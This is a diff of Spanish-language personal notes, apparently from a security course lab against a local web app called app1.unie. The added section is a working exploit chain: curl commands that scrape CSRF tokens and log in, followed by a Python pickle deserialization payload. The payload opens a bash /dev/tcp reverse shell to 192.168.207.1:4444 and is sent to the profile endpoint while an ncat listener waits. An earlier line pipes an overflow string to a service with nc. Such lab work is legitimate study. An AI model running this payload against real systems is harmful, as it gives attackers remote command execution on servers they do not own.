@@ -213,8 +213,6 @@ python3 -c "print('A' * 600)" | nc localhost 5555
 ```
 y tras ponerlo vemos que ahora no sale el texto que salia antes por lo que lo confirmamos
 ![[Pasted image 20251118121221.png]]
-
-
 Probando encontramos una **vulnerabilidad** tipo **Format String Vulnerability**
 
 
@@ -255,9 +253,73 @@ El codigo relacionado con esto se encuentrea en /var/www/html/app1/users/views.p
 ![[Pasted image 20251203102909.png]]
 ahora que confirmamos que está lo explotamos
 
+Para empezar, la página está protegida con **CSRF** por lo que vamos a tener que obtener los csrfs (de login.html) y las cookies de mi sesion
+```
+curl -c cookies.txt http://app1.unie/users/login/ -s > login.html
 
+CSRF1=$(grep -o "csrfmiddlewaretoken.*value='[^']*'" login.html | sed "s/.*value='//;s/'//")
+[ -z "$CSRF1" ] && CSRF1=$(grep -o 'csrfmiddlewaretoken.*value="[^"]*"' login.html | sed 's/.*value="//;s/"//')
+```
+Una vez tenemos el csrf tratamos de hacer login (para esto me he tenido que crear un usuario llamado alejandro con contraseña 1234)
+```
+curl -b cookies.txt -c cookies.txt -v \
+  -d "username=alejandro&password=1234&csrfmiddlewaretoken=$CSRF1&next=/users/profile/" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Referer: http://app1.unie/users/login/" \
+  http://app1.unie/users/login/ 2>&1 | grep -i "set-cookie\|location\|http" 
+```
+Ahora que hemos iniciado sesión y estamos autenticados tenemos que obtener el home autenticado para extrael el csrf de este 
+```
+curl -b cookies.txt http://app1.unie/ -s > home_autenticado.html
+```
+Ahora tenemos que sacar el csrf, para esto tenemos que buscar el formulario de profile (ya que no puedes ir a http://app1.unie/users/profile/ directamente desde el buscador y tienes que ir desde la pagina de inicio)
+```
+grep -n "action=\"/users/profile/\"" home_autenticado.html
 
+LINEA=$(grep -n "action=\"/users/profile/\"" home_autenticado.html | cut -d: -f1)
+if [ ! -z "$LINEA" ]; then
+    echo "Formulario encontrado en línea $LINEA"
+    sed -n "$((LINEA-10)),$((LINEA+10))p" home_autenticado.html
+fi
 
+PROFILE_CSRF=$(cat home_autenticado.html | tr '>' '\n' | grep "csrfmiddlewaretoken" | sed 's/.*value="//' | sed 's/".*//')
+echo "CSRF extraído: $PROFILE_CSRF"
+```
+
+> [!WARNING]  
+> Tienes que copiar el csrf que salga en pantalla y poner PROFILE_CSRF="csrf" como en la imagen
+
+![[Pasted image 20251204163818.png]]
+Una vez ya tenemos el csrf del perfil podemos hacer el RCE, en este caso vamos a hacer una reverse shell por lo que nos ponemos a escuchar con
+```
+ncat -nlvp 4444
+```
+y mandamos el siguiente exploit
+```
+REVERSE_PAYLOAD=$(python3 << 'EOF'
+import pickle, base64
+
+class RCE:
+    def __reduce__(self):
+        import os
+        cmd = "bash -c 'bash -i >& /dev/tcp/192.168.207.1/4444 0>&1' &"
+        return os.system, (cmd,)
+
+print(base64.b64encode(pickle.dumps(RCE())).decode())
+EOF
+)
+
+echo "Enviando reverse shell a 192.168.207.1:4444..."
+curl -b cookies.txt -X POST \
+  -d "usernameSlug=$REVERSE_PAYLOAD&csrfmiddlewaretoken=$PROFILE_CSRF" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Referer: http://app1.unie/" \
+  http://app1.unie/users/profile/ -s > /dev/null
+
+echo "Payload enviado. Revisa tu listener..."
+```
+y confirmamos que hemos conseguido la reverse shell
+![[Pasted image 20251204164328.png]]
 
 
 
@@ -283,3 +345,10 @@ sudo tcpdump -i <interfaz(lo)> icmp
 
 
 para reverse shell rlwarp ... mirar cheat sheet
+
+
+dominio 3
+default ocnfiguration, stateful and stateless inspection, security compliance manager, security information and event manager, honeypot, vpn and ipsec, netework, direc acces, protocol spoofig, ip sec tunneling and dnssec
+
+
+ufw allow puertos para puertos en segunda practica
